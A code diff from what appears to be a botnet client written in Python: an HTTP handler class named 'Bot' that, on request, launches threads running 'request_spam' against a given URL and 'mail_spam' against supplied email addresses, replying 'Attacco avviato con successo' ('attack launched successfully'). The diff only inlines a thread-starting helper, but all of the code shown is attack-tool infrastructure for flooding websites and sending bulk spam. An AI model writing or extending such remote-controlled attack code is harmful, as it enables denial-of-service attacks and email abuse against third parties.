@@ -23,15 +23,6 @@ class Bot(BaseHTTPRequestHandler):
         self.send_header('Content-type', 'application/json')
         self.end_headers()
 
-    def start_thread(self, t):
-        t.daemon = True
-        t.start()
-
-        self.send_response(200)
-        self.send_header('Content-type', 'application/json')
-        self.end_headers()
-        self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))
-
     def do_GET(self):
         if self.path == "/client-info":
             self.set_header()
@@ -47,14 +38,27 @@ class Bot(BaseHTTPRequestHandler):
             body = json.loads(self.rfile.read(content_length).decode('utf-8'))
 
             t = threading.Thread(target=request_spam, args=(body['url'], self.event))
-            self.start_thread(t)
+            t.daemon = True
+            t.start()
+
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))
+
         if self.path == "/mail-spam":
             content_length = int(self.headers['Content-Length'])
             body = json.loads(self.rfile.read(content_length).decode('utf-8'))
 
             t = threading.Thread(target=mail_spam,
                                  args=(body['emails'], body['message'], body["mail_object"], self.event))
-            self.start_thread(t)
+            t.daemon = True
+            t.start()
+
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'success': "Attacco avviato con successo"}).encode('utf-8'))
 
 
 def run():
